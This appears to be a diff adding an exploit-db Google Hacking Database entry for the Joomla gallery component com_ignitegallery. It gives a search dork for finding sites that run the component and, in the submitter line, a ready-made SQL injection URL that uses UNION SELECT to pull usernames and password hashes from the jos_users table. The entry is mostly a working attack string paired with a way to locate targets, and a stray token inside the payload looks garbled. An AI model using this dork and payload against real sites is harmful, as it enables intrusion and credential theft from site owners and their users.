@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/3706
+Category:         Advisories and Vulnerabilities
+Published Date:   2011-03-27
+Author:           anonymous
+GoogleDork:       index.php?option=com_ignitegallery
+Description:      index.php?option=com_ignitegallery
+
+
+Submitter: TiGeR_YeMeN HaCkEr SQL Injection: index.php?option=com_ignitegallery&amp;task=view&amp;gallery=-1+union+select+1,2,concat(username,char(58),password)KHG,4,5,6,7,8,9,10+from+jos_users--
